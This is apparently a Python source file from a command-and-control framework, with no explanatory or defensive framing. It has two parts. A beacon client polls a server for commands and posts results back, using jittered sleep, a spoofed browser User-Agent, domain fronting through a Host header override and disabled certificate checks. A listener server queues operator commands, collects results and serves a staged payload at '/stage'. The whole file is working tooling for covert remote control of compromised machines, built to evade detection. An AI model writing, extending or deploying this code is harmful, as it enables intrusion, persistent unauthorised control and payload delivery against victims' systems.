import json
import threading
import time
import random
import ssl
from typing import Any, Optional
from collections import deque


class HttpBeaconProtocol:
    """HTTP/S-based C2 protocol — replaces persistent TCP with periodic polling."""

    def __init__(self, server_url: str, front_host: Optional[str] = None,
                 user_agent: str = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                 sleep_time: float = 5.0, jitter: float = 0.3):
        self._url = server_url.rstrip('/')
        self._front_host = front_host
        self._user_agent = user_agent
        self._sleep_time = sleep_time
        self._jitter = jitter
        self._session = self._build_session()
        self._pending_commands: deque = deque()
        self._recv_lock = threading.Lock()

    def _build_session(self):
        try:
            import requests
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': self._user_agent})
            if self._front_host:
                session.headers.update({'Host': self._front_host})
            return session
        except ImportError:
            return None

    def send(self, data: Any) -> None:
        """POST result back to server."""
        if self._session is None:
            return
        try:
            payload = data if isinstance(data, str) else json.dumps(data)
            self._session.post(
                f'{self._url}/push',
                data=payload,
                headers={'Content-Type': 'application/json'},
                timeout=30,
            )
        except Exception:
            pass

    def recv(self) -> Any:
        """Poll server for next command. Blocks until a command is available."""
        while True:
            if self._pending_commands:
                with self._recv_lock:
                    if self._pending_commands:
                        return self._pending_commands.popleft()

            if self._session is None:
                time.sleep(self._get_sleep())
                continue

            try:
                resp = self._session.get(
                    f'{self._url}/poll',
                    timeout=30,
                )
                if resp.status_code == 200 and resp.text.strip():
                    data = resp.json()
                    if isinstance(data, list):
                        for cmd in data:
                            self._pending_commands.append(str(cmd))
                    else:
                        self._pending_commands.append(str(data))
            except Exception:
                pass

            time.sleep(self._get_sleep())

    def _get_sleep(self) -> float:
        j = self._sleep_time * self._jitter
        return self._sleep_time + random.uniform(-j, j)

    def set_sleep(self, seconds: float, jitter: float = 0.3):
        self._sleep_time = seconds
        self._jitter = jitter


class HttpC2Server:
    """Lightweight HTTP C2 listener using Python's built-in http.server."""

    def __init__(self, host: str = '0.0.0.0', port: int = 443,
                 use_tls: bool = True, certfile: str = None, keyfile: str = None,
                 stage_payload: bytes = None):
        self._host = host
        self._port = port
        self._use_tls = use_tls
        self._certfile = certfile
        self._keyfile = keyfile
        self._stage_payload = stage_payload
        self._outgoing: deque = deque()
        self._incoming: deque = deque()
        self._lock = threading.Lock()
        self._server = None
        self._thread: Optional[threading.Thread] = None

    def start(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler

        outgoing = self._outgoing
        incoming = self._incoming
        lock = self._lock
        stage_payload = self._stage_payload

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

            def do_GET(self):
                if self.path == '/stage' and stage_payload:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.send_header('Content-Length', str(len(stage_payload)))
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(stage_payload)
                    return
                if self.path == '/poll':
                    with lock:
                        if outgoing:
                            cmd = outgoing.popleft()
                            self._respond(200, cmd)
                            return
                    self._respond(204, '')

            def do_POST(self):
                if self.path == '/push':
                    length = int(self.headers.get('Content-Length', 0))
                    if length > 0:
                        data = self.rfile.read(length).decode()
                        with lock:
                            incoming.append(data)
                    self._respond(200, 'ok')

            def _respond(self, code, body):
                self.send_response(code)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                if body:
                    self.wfile.write(json.dumps(body).encode() if not isinstance(body, str) else body.encode())

        class ThreadedHTTPServer(HTTPServer):
            allow_reuse_address = True
            daemon_threads = True

            def handle_error(self, request, client_address):
                pass

        self._server = ThreadedHTTPServer((self._host, self._port), Handler)

        if self._use_tls:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                if self._certfile and self._keyfile:
                    ctx.load_cert_chain(self._certfile, self._keyfile)
                else:
                    ctx.load_default_certs()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                self._server.socket = ctx.wrap_socket(
                    self._server.socket, server_side=True
                )
            except Exception:
                pass

        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server = None

    def queue_command(self, command: str):
        with self._lock:
            self._outgoing.append(command)

    def get_result(self) -> Optional[str]:
        with self._lock:
            return self._incoming.popleft() if self._incoming else None

    def poll_result(self, timeout: float = None) -> Optional[str]:
        import time as t
        start = t.time()
        while timeout is None or t.time() - start < timeout:
            result = self.get_result()
            if result is not None:
                return result
            t.sleep(0.1)
        return None

    @property
    def address(self) -> str:
        scheme = 'https' if self._use_tls else 'http'
        return f'{scheme}://{self._host}:{self._port}'
